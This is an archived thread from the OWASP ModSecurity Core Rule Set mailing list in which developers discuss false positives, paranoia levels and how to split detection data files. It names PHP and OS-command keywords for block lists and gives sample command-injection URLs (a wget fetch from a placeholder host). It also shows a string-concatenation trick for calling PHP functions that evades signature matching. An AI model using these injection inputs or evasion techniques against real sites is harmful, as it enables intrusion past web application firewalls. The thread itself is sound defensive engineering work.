>- IO: file_get_contents, file_put_contents, fopen, fwrite...
>- environment inspection and setting: error_reporting, function_exists,
>ini_set, auto_prepend_file, sys_get_temp_dir...
>
>If any of those strings is present, it?s certainly an attack, except for
>that single person who runs a PHP-related wiki. The list should only
>contain the real red flags, don?t try to cleverly prevent FP using
>complex regexps, and cannot contain any common English words (so
>unfortunately ?require? and ?include? are off limits...)
>
>4) Other functions could go in ?php-commands-functions.data?. This list
>would be small and contain only *proper functions* having PHP syntax
>?function()? and have names often used in natural text. To prevent FP we
>look for the parenthesis. Let?s take example ?system?, this is often
>found in natural text, but an attacker wants to do ?system(? so they need
>parentheses and a word boundary at the start. So a regexp might look like
>"\bsystem\s*\(?. Because we have the regexp, FP is lowered. It would
>still match stuff like ?F*ck the system (yeah yeah)?
>
>5) Other PHP related terms could stay in ?php-commands-common.data?. This
>would list the PHP commands and terms of lesser interest.
>
>6) We?ll have to review if there are terms which are so common in natural
>text that they?ll have to be moved to ?php-commands-paranoid.data?. I
>think this list might be as small as possible. Maybe stuff like ?dl?,
>?require?, ?include?. It?s still likely to produce FP...
>
>7) String matching for PHP functions is not powerful enough. We need
>generic rules that prevent PHP evasion. I don?t remember seeing this in
>the wild, but an easy way to evade textual signature matches would be PHP
>variable functions
>(http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPk
>vCjeQMDpQ&s=5&u=http%3a%2f%2fphp%2enet%2fmanual%2fen%2ffunctions%2evariabl
>e-functions%2ephp%29 For instance, you can do the following to get around
>the CRS:
>
>$aB_4c = 'fil' . 'e_get' . '_contents';
>$aB_4c('...');
>
>So we want a generic signature to detect variable function call syntax.
>Fortunately its syntax is very uncommon in natural text, so I?d advocate
>putting this rule in normal mode.
>
>Anyway my ?0.02 or maybe a bit more :)
>
>
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPkq
>emcgoEpA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>asp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From christian.folini at netnea.com  Sun Feb  7 19:05:09 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 7 Feb 2016 20:05:09 +0100
Subject: [Owasp-modsecurity-core-rule-set] libinjection (was: Paranoia
 Mode: Controversial candidate 950120 / 931130 (Possible RFI))
In-Reply-To: <D2DB8063.174F6%csanders@trustwave.com>
References: <20160202080600.GA29931@elias>
	<8F47FE1E-C1DA-4B07-85FD-3A8C2E3B119C@spam.lifeforms.nl>
	<20160204090826.GA27990@elias>
	<589BCC4A-9687-44F9-8780-5A40A3F63A40@spam.lifeforms.nl>
	<D2DB8063.174F6%csanders@trustwave.com>
Message-ID: <20160207190508.GA30297@elias>

Good evening,

On Sat, Feb 06, 2016 at 03:53:06PM +0000, Chaim Sanders wrote:
> This is very helpful, recently I've come to share in some views of the community that libinjection isn't the most well supported/reviewed of all the projects on github. Fortunately compared to many other projects it is quite small from a codebase perspective and as a result the attack surface isn't outrageous, and reviewing it is reasonable. That being said we NEED to continue to including other rules that suppliment libinjection in case of a bypass, which is what we do in v3.0.0-rc1 :)

Chaim, I remember you stating, that you guys might be able to
help the libinjection project with a code review. Is this 
still an option? I think it would be very helpful and fix a 
sore spot.

The fact that the codebase is of a reasonable size give me
hope.

Ahoj,

Christian


-- 
Seek simplicity, and distrust it.
-- Alfred North Whitehead

From CSanders at trustwave.com  Sun Feb  7 19:07:49 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Sun, 7 Feb 2016 19:07:49 +0000
Subject: [Owasp-modsecurity-core-rule-set] libinjection (was: Paranoia
 Mode: Controversial candidate 950120 / 931130 (Possible RFI))
In-Reply-To: <20160207190508.GA30297@elias>
References: <20160202080600.GA29931@elias>
	<8F47FE1E-C1DA-4B07-85FD-3A8C2E3B119C@spam.lifeforms.nl>
	<20160204090826.GA27990@elias>
	<589BCC4A-9687-44F9-8780-5A40A3F63A40@spam.lifeforms.nl>
	<D2DB8063.174F6%csanders@trustwave.com> <20160207190508.GA30297@elias>
Message-ID: <D2DCFFD0.17536%csanders@trustwave.com>

Yes, we could probably end up doing a review, I?m sure they wouldn?t mind
:).

On 2/7/16, 2:05 PM, "Christian Folini" <christian.folini at netnea.com> wrote:

>Good evening,
>
>On Sat, Feb 06, 2016 at 03:53:06PM +0000, Chaim Sanders wrote:
>> This is very helpful, recently I've come to share in some views of the
>>community that libinjection isn't the most well supported/reviewed of
>>all the projects on github. Fortunately compared to many other projects
>>it is quite small from a codebase perspective and as a result the attack
>>surface isn't outrageous, and reviewing it is reasonable. That being
>>said we NEED to continue to including other rules that suppliment
>>libinjection in case of a bypass, which is what we do in v3.0.0-rc1 :)
>
>Chaim, I remember you stating, that you guys might be able to
>help the libinjection project with a code review. Is this
>still an option? I think it would be very helpful and fix a
>sore spot.
>
>The fact that the codebase is of a reasonable size give me
>hope.
>
>Ahoj,
>
>Christian
>
>
>--
>Seek simplicity, and distrust it.
>-- Alfred North Whitehead


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From christian.folini at netnea.com  Sun Feb  7 19:23:39 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 7 Feb 2016 20:23:39 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
Message-ID: <20160207192339.GB30297@elias>

Walter,

On Sat, Feb 06, 2016 at 08:42:26PM +0100, Walter Hop wrote:
> To talk about my opinion of with this rule a bit, it?s super easy to trigger it.
> Just any text input for a URL will do.
> For example: http://example/?url=https://yahoo.com/

Just to make sure we are on the same boat: This
rule triggers on any argument containing a URI
which does not start with a FQDN identical with the
host-header of the request. Am I right?

> That is super common and bound to give various false positives on registration forms, contact forms, blog comment forms, etcetera. Firing on any plain URL submitted in a form? That?s a prime example of being paranoid :)

I can not really tell, why I hardly see any FP with this. But ok. I agree with
you, this is paranoid.

> My recommendation would be:
> 1) Put the full rule in paranoid set

Agree with that.

> 2) In the basic set, clone this rule, but ensure it doesn?t work on ARGS:url

I understand your reasoning. But is not that too much fiddling?
Or is ARGS:url that common? I have the same functionality on 
ARGS:target
ARGS:remote
ARGS:back
...

Can't we leave that sort of tuning to the sysadmins?
Why don't we simply move the rule from standard to paranoia mode
as it has too many false positives.


> 3) In the basic set, possibly consider raising the anomaly score if it?s sent as ARGS:id, ARGS:page

It is already critical.

Cheers,

Christian


-- 
The need for mystery is greater than the need for an answer.
--- Ken Kesey

From christian.folini at netnea.com  Sun Feb  7 19:55:30 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 7 Feb 2016 20:55:30 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>
References: <20160202081718.GB29931@elias>
	<69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>
Message-ID: <20160207195530.GC30297@elias>

Hi there,

On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
> I like the idea of splitting the file.

Cool.

> I agree some of the words in os-commands.data seem rather paranoid. Words like "choice", "help", "now? seem of low value and are common in natural text. Also, the large number of Unix-only environments could skip Windows related commands. It?s hard for users to modify these lists as you?d have to hack the CRS, and these huge collections are to maintain anyhow, so I agree we need granularity.

Good point.

> The rule has some regexp magic to prevent false positives, but the balance is not a complete success in my opinion. For instance, the following URLs don't trigger in CRSv3:
> http://vuln/?cmd=wget%20http://example.com/blah.txt
> http://vuln/?cmd=sh%20blah.txt
> 
> So it's not as strong as you would want either to prevent some common RCE.
> Something like http://vuln/?cmd=Wget%20http://example.com/;%20ecHo does trigger it.

I see. Good observations.

> 1) I think that a user should check their desired platforms in the setup conf. In fact, this would be great to do anyway in the initial 3.0.0 release even if we DON'T look at it in any rule yet. Specifying platform types will pave the way for reducing false positives and false negatives by skipping unnecessary checks and being more strict on the right platforms. So we could start by listing these platforms in the existing rule in the setup conf. Example:
> 
> 	SecAction \
> 	  "id:'900024', \
> 	  phase:1, \
> 	  t:none, \
> 	  setvar:tx.unix=1, \
> 	  setvar:tx.windows=1, \
> 	  setvar:tx.java=1, \
> 	  setvar:tx.php=1, \

That makes a lot of sense. At first sight.

I think that a default install should come with these rulesets
all enabled and a sysadmin can then switch them of if we is aware that
there is no php in his service.

So given the following two scenarios
#1 - Newbie sysadmin installs ModSec and runs into a lot of false positives
    because he does not disable unneeded rulesets
#2 - Newbie sysadmin installs ModSec and is p0wned because he does not enable
    the php protection
I strongly favour #1.

A vanilla install of the core rules should give you a full coverage for all
types of services and a decent security level. Reducing false positives by 
omitting certain rules (ideally rules which provide no value for your setup) 
is the very idea of tuning.
Reducing the initial number of false positives by moving certain rules
with a worse relationsship between added security and false positives,
that is the idea of the paranoia mode.

Chaim stated in a different message, that the rules are now organised
into files aimed at certain environments. So switching them off is
fairly easy. And there are the tags on top of it.
So you have tag:'language-PHP' and setting SecRuleRemoveByTag will
disable them all very easily. 

So I think, we do not need these variables.

> (By the way: I think it?s unfortunate that a user has to use value 1 to enable a check. An undefined variable will mean that the CRS will skip some rules. This makes it dangerous to introduce a new variable in the CRS later; all existing installations MUST then add this variable to their setup rule immediately, or suffer from reduced security. It?s better to use a scheme that defaults to ?on?. A convention like ?tx.disable_mysql=1? would be user unfriendly and error-prone. But we could check for an explicit ?off? string, e.g. ?setvar:tx.mysql=off?. If it?s not ?off? then assume that the user DOES want the check. I think it?s important to get this right in 3.0.0, it will be more painful to do it later.)

That's a very good observation. I had a similar idea once.

In programming, you usually start with a default value and then
the users overrides the default value. If he wants to.

I am not sure how modsecurity_crs_10_setup.conf.example is going to
be transformed to work seamlessly with 3.0. But this makes the
setting of default values a bit tricky.

Maybe a file REQUEST-02-DEFAULTS.conf could set default values
if certain variables are not set.

> 2) Separate the words into multiple lists:
> 	os-commands-critical.data (absolute red flag list: "curl", "passwd", "sh", "uname", "wget" etc.)
> 	os-commands-paranoid.data (absolute low value, but high FP natural words like "choice")
> 	os-commands-windows.data (all Windows commands)
> 	os-commands-common.data (all other commands)

Makes some sense. Too granular is difficult and you mix various
grouping criteria (criticality, paranoia, os), which makes is a
bit hard to follow. 

Other opinions?

> 3) Review the current regexp against some test data and CRSv2 to make it more sensitive

Good plan. Maybe this could be done in a separate pull request.
I am afraid to overload the paranoia mode pull request... 

Ahoj,

Christian


-- 
In war you will generally find that the enemy has at any time 
three courses of action open to him. Of those three, he will 
invariably choose the fourth.
-- Helmuth Von Moltke

From christian.folini at netnea.com  Sun Feb  7 20:12:06 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 7 Feb 2016 21:12:06 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 958977 / 933110 and 958979 / 933120 (PHP Injection Attacks)
In-Reply-To: <D2DCD071.1752C%csanders@trustwave.com>
References: <20160202082502.GC29931@elias>
	<54703590-4F48-4A1B-9271-E1E29A45FE39@spam.lifeforms.nl>
	<D2DCD071.1752C%csanders@trustwave.com>
Message-ID: <20160207201206.GD30297@elias>

Hello,

Your ideas are extremely valuable Walter. And even if I do not agree 
with your solutions to the letter, I love the fact that we are having
technical discussions on the merit of individual rules.

Chaim seems to be on the same page with me on the idea of
environment-specific rules and how to handle the enabling / disabling.

And then the problem of the granularity of the files. There is a
danger in overengineering things and making the configuration / tuning
too complex. In that light, I think splitting makes sense, but
ideally, we end up with 

xxx-standard.data
xxx-paranoia.data

However, you have a point that you can not alter the contents of these 
data files afterwards in a local setup in a safe way. So disabling Windows 
commands won't work unless we add specific data files with their own
rules, which can then be disabled.

I am really torn here.

In my stated fear of overloading the paranoia project / pull request,
I would appreciate to handle the big updates to individual rules
in separate pull requests - if possible. If it has to be, we include it.

Ahoj,

Christian


On Sun, Feb 07, 2016 at 03:46:32PM +0000, Chaim Sanders wrote:
> I like the ideas. The first thing I?d note is that individuals are free to
> exclude or remove entire files so as long as the PHP file is named
> REQUEST-XYZ-PHP-XYZ people running ASP should get this hint (hopefully)
> this is why we name them in this way. In terms of splitting the files, I
> most certainly agree with the ?critical?. Again I caution against
> splitting data files TOO finely as it will get confusing to support your
> own instance but this is just a minor issue. As for those parenthesis. You
> are right and this is actually my fault. I added them to prevent false
> positives being reported commonly on Cpanel.
> 
> On 2/7/16, 8:58 AM,
> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> Walter Hop" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
> behalf of modsec at spam.lifeforms.nl> wrote:
> 
> >On 02 Feb 2016, at 09:25, Christian Folini <christian.folini at netnea.com>
> >wrote:
> >>
> >> Like the previous post on 950907 / 932100, this is controversial because
> >> of possible false positives due to a data file with strings:
> >>
> >>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPk
> >>vSmewhU_w&s=5&u=https%3a%2f%2fraw%2egithubusercontent%2ecom%2fSpiderLabs%
> >>2fowasp-modsecurity-crs%2fv3%2e0%2e0-rc1%2frules%2fphp-function-names%2ed
> >>ata
> >>
> >>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPk
> >>qKjKQ1VqQ&s=5&u=https%3a%2f%2fraw%2egithubusercontent%2ecom%2fSpiderLabs%
> >>2fowasp-modsecurity-crs%2fv3%2e0%2e0-rc1%2frules%2fphp-config-directives%
> >>2edata
> >>
> >> Could these files be split in the manner explained in the message
> >> before?
> >>
> >> After all, this rule scans input against strings like
> >> dl, eval, exec, from, precision.
> >
> >I would advocate the same separation as in my previous post re
> >os-commands.
> >But we need a little more firepower for PHP in my opinion.
> >A detailed approach could go like this...
> >
> >1) Have the user indicate with setvar if they want to protect PHP, and
> >predicate the rules on that. All the non PHP shops will be solved from FP
> >instantly!
> >
> >2) We need to review the current data file:
> >- I?m missing some stuff there that I see in the wild every day such as:
> >gzinflate, gzdecode, gzuncompress, strrev, zlib_decode?
> >- I also see in some cases the parenthesis is added, like: /file(/ and
> >/assert(/. This seems easy to evade. In PHP, calling ?assert      ($foo)?
> >or ?assert\t\t\t($foo)? is just as valid. In this case, it was probably
> >done because those terms lead to FP. If so, we might move super common
> >terms with relatively low attacker interest, like assert, to the paranoid
> >list. But, in any case they should become more robust regexps like
> >?\bfile\s*(?.
> >
> >3) Separate the data file. Start with a small
> >?php-commands-critical.data? list. This should contain the usual suspects
> >used for:
> >- obfuscation: base64_decode, gzdecode, etc...
> >- execution: passthru, proc_open, shell_exec, call_user_func,
> >require_once, include_once...
> >- IO: file_get_contents, file_put_contents, fopen, fwrite...
> >- environment inspection and setting: error_reporting, function_exists,
> >ini_set, auto_prepend_file, sys_get_temp_dir...
> >
> >If any of those strings is present, it?s certainly an attack, except for
> >that single person who runs a PHP-related wiki. The list should only
> >contain the real red flags, don?t try to cleverly prevent FP using
> >complex regexps, and cannot contain any common English words (so
> >unfortunately ?require? and ?include? are off limits...)
> >
> >4) Other functions could go in ?php-commands-functions.data?. This list
> >would be small and contain only *proper functions* having PHP syntax
> >?function()? and have names often used in natural text. To prevent FP we
> >look for the parenthesis. Let?s take example ?system?, this is often
> >found in natural text, but an attacker wants to do ?system(? so they need
> >parentheses and a word boundary at the start. So a regexp might look like
> >"\bsystem\s*\(?. Because we have the regexp, FP is lowered. It would
> >still match stuff like ?F*ck the system (yeah yeah)?
> >
> >5) Other PHP related terms could stay in ?php-commands-common.data?. This
> >would list the PHP commands and terms of lesser interest.
> >
> >6) We?ll have to review if there are terms which are so common in natural
> >text that they?ll have to be moved to ?php-commands-paranoid.data?. I
> >think this list might be as small as possible. Maybe stuff like ?dl?,
> >?require?, ?include?. It?s still likely to produce FP...
> >
> >7) String matching for PHP functions is not powerful enough. We need
> >generic rules that prevent PHP evasion. I don?t remember seeing this in
> >the wild, but an easy way to evade textual signature matches would be PHP
> >variable functions
> >(http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPk
> >vCjeQMDpQ&s=5&u=http%3a%2f%2fphp%2enet%2fmanual%2fen%2ffunctions%2evariabl
> >e-functions%2ephp%29 For instance, you can do the following to get around
> >the CRS:
> >
> >$aB_4c = 'fil' . 'e_get' . '_contents';
> >$aB_4c('...');
> >
> >So we want a generic signature to detect variable function call syntax.
> >Fortunately its syntax is very uncommon in natural text, so I?d advocate
> >putting this rule in normal mode.
> >
> >Anyway my ?0.02 or maybe a bit more :)
> >
> >
> >_______________________________________________
> >Owasp-modsecurity-core-rule-set mailing list
> >Owasp-modsecurity-core-rule-set at lists.owasp.org
> >http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPkq
> >emcgoEpA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
> >asp-modsecurity-core-rule-set
> 
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Sun Feb  7 20:12:54 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 7 Feb 2016 21:12:54 +0100
Subject: [Owasp-modsecurity-core-rule-set] libinjection (was: Paranoia
 Mode: Controversial candidate 950120 / 931130 (Possible RFI))
In-Reply-To: <D2DCFFD0.17536%csanders@trustwave.com>
References: <20160202080600.GA29931@elias>
	<8F47FE1E-C1DA-4B07-85FD-3A8C2E3B119C@spam.lifeforms.nl>
	<20160204090826.GA27990@elias>
	<589BCC4A-9687-44F9-8780-5A40A3F63A40@spam.lifeforms.nl>
	<D2DB8063.174F6%csanders@trustwave.com>
	<20160207190508.GA30297@elias>
	<D2DCFFD0.17536%csanders@trustwave.com>
Message-ID: <20160207201254.GE30297@elias>

On Sun, Feb 07, 2016 at 07:07:49PM +0000, Chaim Sanders wrote:
> Yes, we could probably end up doing a review, I?m sure they wouldn?t mind
> :).

That would be really cool.

Christian

> 
> On 2/7/16, 2:05 PM, "Christian Folini" <christian.folini at netnea.com> wrote:
> 
> >Good evening,
> >
> >On Sat, Feb 06, 2016 at 03:53:06PM +0000, Chaim Sanders wrote:
> >> This is very helpful, recently I've come to share in some views of the
> >>community that libinjection isn't the most well supported/reviewed of
> >>all the projects on github. Fortunately compared to many other projects
> >>it is quite small from a codebase perspective and as a result the attack
> >>surface isn't outrageous, and reviewing it is reasonable. That being
> >>said we NEED to continue to including other rules that suppliment
> >>libinjection in case of a bypass, which is what we do in v3.0.0-rc1 :)
> >
> >Chaim, I remember you stating, that you guys might be able to
> >help the libinjection project with a code review. Is this
> >still an option? I think it would be very helpful and fix a
> >sore spot.
> >
> >The fact that the codebase is of a reasonable size give me
> >hope.
> >
> >Ahoj,
> >
> >Christian
> >
> >
> >--
> >Seek simplicity, and distrust it.
> >-- Alfred North Whitehead
> 
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Sun Feb  7 20:22:11 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 7 Feb 2016 21:22:11 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 960015 / 920300 and 960017 / 920350 (Header issues)
In-Reply-To: <E4C53A5B-D359-4E59-B137-659E4EB926C6@spam.lifeforms.nl>
References: <20160202083257.GD29931@elias>
	<E4C53A5B-D359-4E59-B137-659E4EB926C6@spam.lifeforms.nl>
Message-ID: <20160207202211.GF30297@elias>

Hello again,

On Sun, Feb 07, 2016 at 03:22:03PM +0100, Walter Hop wrote:
> In my logs I only see mass scanners trying this, and there is one vendor appliance which is doing ?compliance? checks on an IP address constantly. This appliance annoys me: you don?t even know my HOSTNAME and you make claims about my site actually being working and compliant? And people pay money for that? I like blocking that thing out of spite, but that?s just personal.

It's totally true that it's an annoying practice and 
should be stopped. But if you look at it with the
eyes of a newbie ModSec user, he will see a lot of
FPs in this class, which block the view on the more
severed alerts. Not necessarily by score, but by sheer
number of alerts.

Moving it to paranoia mode would free the view on the
more important exceptions.

> Anyway, you?ve given some good cases for allowing IP addresses, it?s not too controversial.

Thanks.

On Sun, Feb 07, 2016 at 03:30:39PM +0000, Chaim Sanders wrote:
> It's kind of a mixed bag because we still want ModSecurity to be effective at blocking the easy rift raft (opportunistic attackers) but we want it to be easy to configure. Perhaps we make a 'domain name' configuration in the setup.conf and if it has been configured the rule comes into effect. I don't know that IF they have a domain we see too many false positives, most are things that as walter described, are just laziness. Thoughts?

Why don't we simply move it to paranoia mode? Instead of having to
understand the additional "domain name" config, a user simply raises the
paranoia level and ends up with more positives and if he thinks
some of these requests are leggit/FPs, he will whitelist them.
That would have the same effect as the "domain name" configuration
but with a more generic tuning process.

Ahoj,

Christian


-- 
It must be obvious... that there is a contradiction in wanting to
be perfectly secure in a universe whose very nature is momentariness and
fluidity.      ?
-- Alan Watts

From barry_pollard at hotmail.com  Sun Feb  7 21:40:20 2016
From: barry_pollard at hotmail.com (Barry Pollard)
Date: Sun, 7 Feb 2016 21:40:20 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 960015 / 920300 and 960017 / 920350 (Header issues)
In-Reply-To: <20160207202211.GF30297@elias>
References: <20160202083257.GD29931@elias>
	<E4C53A5B-D359-4E59-B137-659E4EB926C6@spam.lifeforms.nl>
	<20160207202211.GF30297@elias>
Message-ID: <DUB406-EAS80C7C8739638B1CFDD132482D40@phx.gbl>

In my opinion there are few real world examples of people intentionally using IP address over hostname and the website owner should know them all (e.g. Load balancers, health checkers and internal system scanners). It's easy to whitelist those specific systems.

So anything else using IP address is likely a bot iterating through IP addresses and I do think they represent a threat and not just an annoyance and so the CRS should block by default.

I also found it eye opening the amount of scanners hitting my sites when I turned ModSecurity on for the first time. Now granted most has likely been scanning my site for years with no issues, and they can cause people to panic when they see the sheer volume for first time, but I still think enlightening none the less.

So I'd be more in favour of leaving this in normal mode. Perhaps adding some commented out examples of how to whitelist certain IP addresses from this (or all?) rule(s) if it really is that common a problem that people get overwhelmed by their internal systems using IP address.

Thanks,
Barry

P.S. Some great discussions going on. Great to see!

> On 7 Feb 2016, at 20:32, Christian Folini <christian.folini at netnea.com> wrote:
> 
> Hello again,
> 
>> On Sun, Feb 07, 2016 at 03:22:03PM +0100, Walter Hop wrote:
>> In my logs I only see mass scanners trying this, and there is one vendor appliance which is doing ?compliance? checks on an IP address constantly. This appliance annoys me: you don?t even know my HOSTNAME and you make claims about my site actually being working and compliant? And people pay money for that? I like blocking that thing out of spite, but that?s just personal.
> 
> It's totally true that it's an annoying practice and 
> should be stopped. But if you look at it with the
> eyes of a newbie ModSec user, he will see a lot of
> FPs in this class, which block the view on the more
> severed alerts. Not necessarily by score, but by sheer
> number of alerts.
> 
> Moving it to paranoia mode would free the view on the
> more important exceptions.
> 
>> Anyway, you?ve given some good cases for allowing IP addresses, it?s not too controversial.
> 
> Thanks.
> 
>> On Sun, Feb 07, 2016 at 03:30:39PM +0000, Chaim Sanders wrote:
>> It's kind of a mixed bag because we still want ModSecurity to be effective at blocking the easy rift raft (opportunistic attackers) but we want it to be easy to configure. Perhaps we make a 'domain name' configuration in the setup.conf and if it has been configured the rule comes into effect. I don't know that IF they have a domain we see too many false positives, most are things that as walter described, are just laziness. Thoughts?
> 
> Why don't we simply move it to paranoia mode? Instead of having to
> understand the additional "domain name" config, a user simply raises the
> paranoia level and ends up with more positives and if he thinks
> some of these requests are leggit/FPs, he will whitelist them.
> That would have the same effect as the "domain name" configuration
> but with a more generic tuning process.
> 
> Ahoj,
> 
> Christian
> 
> 
> -- 
> It must be obvious... that there is a contradiction in wanting to
> be perfectly secure in a universe whose very nature is momentariness and
> fluidity.       
> -- Alan Watts
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From christian.folini at netnea.com  Sun Feb  7 21:53:55 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 7 Feb 2016 22:53:55 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 960015 / 920300 and 960017 / 920350 (Header issues)
In-Reply-To: <DUB406-EAS80C7C8739638B1CFDD132482D40@phx.gbl>
References: <20160202083257.GD29931@elias>
	<E4C53A5B-D359-4E59-B137-659E4EB926C6@spam.lifeforms.nl>
	<20160207202211.GF30297@elias>
	<DUB406-EAS80C7C8739638B1CFDD132482D40@phx.gbl>
Message-ID: <20160207215355.GB1148@elias>

Barry,

Thanks for chiming in. The more people, the better decisions we will
make.

On Sun, Feb 07, 2016 at 09:40:20PM +0000, Barry Pollard wrote:
> In my opinion there are few real world examples of people intentionally using IP address over hostname and the website owner should know them all (e.g. Load balancers, health checkers and internal system scanners). It's easy to whitelist those specific systems.

This is going to be anecdotal evidence, but I think it is not
uncommon to have
- 2 LBs (polling every 5 seconds each)
- service monitor (polling once a minute)
- 2 sysadmins configuring some kine of online
  uptime monitor privately in order to get an
  alarm ahead of time via text if something is
  amiss. (polling every then seconds)

And all via the IP address. If you have two redundant
servers, you easily get 60-70 alerts per minute.

But maybe the setups I know are just crazy.
In the end, I can live with this rule in standard mode
or in paranoia mode.

And it's not like it's hard to tune. It's just
terrifying when it happens for the first time.

Cheers,

Christian









> 
> So anything else using IP address is likely a bot iterating through IP addresses and I do think they represent a threat and not just an annoyance and so the CRS should block by default.
> 
> I also found it eye opening the amount of scanners hitting my sites when I turned ModSecurity on for the first time. Now granted most has likely been scanning my site for years with no issues, and they can cause people to panic when they see the sheer volume for first time, but I still think enlightening none the less.
> 
> So I'd be more in favour of leaving this in normal mode. Perhaps adding some commented out examples of how to whitelist certain IP addresses from this (or all?) rule(s) if it really is that common a problem that people get overwhelmed by their internal systems using IP address.
> 
> Thanks,
> Barry
> 
> P.S. Some great discussions going on. Great to see!
> 
> > On 7 Feb 2016, at 20:32, Christian Folini <christian.folini at netnea.com> wrote:
> > 
> > Hello again,
> > 
> >> On Sun, Feb 07, 2016 at 03:22:03PM +0100, Walter Hop wrote:
> >> In my logs I only see mass scanners trying this, and there is one vendor appliance which is doing ?compliance? checks on an IP address constantly. This appliance annoys me: you don?t even know my HOSTNAME and you make claims about my site actually being working and compliant? And people pay money for that? I like blocking that thing out of spite, but that?s just personal.
> > 
> > It's totally true that it's an annoying practice and 
> > should be stopped. But if you look at it with the
> > eyes of a newbie ModSec user, he will see a lot of
> > FPs in this class, which block the view on the more
> > severed alerts. Not necessarily by score, but by sheer
> > number of alerts.
> > 
> > Moving it to paranoia mode would free the view on the
> > more important exceptions.
> > 
> >> Anyway, you?ve given some good cases for allowing IP addresses, it?s not too controversial.
> > 
> > Thanks.
> > 
> >> On Sun, Feb 07, 2016 at 03:30:39PM +0000, Chaim Sanders wrote:
> >> It's kind of a mixed bag because we still want ModSecurity to be effective at blocking the easy rift raft (opportunistic attackers) but we want it to be easy to configure. Perhaps we make a 'domain name' configuration in the setup.conf and if it has been configured the rule comes into effect. I don't know that IF they have a domain we see too many false positives, most are things that as walter described, are just laziness. Thoughts?
> > 
> > Why don't we simply move it to paranoia mode? Instead of having to
> > understand the additional "domain name" config, a user simply raises the
> > paranoia level and ends up with more positives and if he thinks
> > some of these requests are leggit/FPs, he will whitelist them.
> > That would have the same effect as the "domain name" configuration
> > but with a more generic tuning process.
> > 
> > Ahoj,
> > 
> > Christian
> > 
> > 
> > -- 
> > It must be obvious... that there is a contradiction in wanting to
> > be perfectly secure in a universe whose very nature is momentariness and
> > fluidity.       
> > -- Alan Watts
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From barry_pollard at hotmail.com  Sun Feb  7 22:01:39 2016
